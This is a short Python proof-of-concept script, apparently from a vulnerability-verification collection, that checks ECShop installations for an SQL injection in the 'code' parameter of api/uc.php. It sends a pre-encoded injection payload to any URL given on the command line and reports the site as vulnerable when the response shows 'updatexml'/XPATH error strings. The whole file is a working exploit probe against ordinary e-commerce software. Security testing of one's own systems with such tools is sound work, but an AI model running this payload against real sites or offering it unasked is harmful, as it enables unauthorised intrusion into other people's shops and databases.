#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: ecshop uc.php参数code SQL注入
referer: http://www.wooyun.org/bugs/WooYun-2016-174468
author: Lucifer
description: 文件uc.php中,参数code存在SQL注入。
'''
import sys
import requests



class ecshop_uc_code_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/api/uc.php?code=6116diQV4NziG3G8ttFnwTYmEp60E3K27Q0fDWaey%2bTuNLsGKdb1%2b6bPFT%2fIjJEMPlzS5Tm3InnRZKczTQBFXzXmDD5bs4Il5pbFswzA9SWE4gqcbuN8LgLJlTQqvVeSRUfFn4dhgto6yjPsJp7Za6GJEQ"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"updatexml" in req.text and r"XPATH" in req.text:
                return "[+]存在ecshop uc.php参数code SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = ecshop_uc_code_sqli_BaseVerify(sys.argv[1])
    testVuln.run()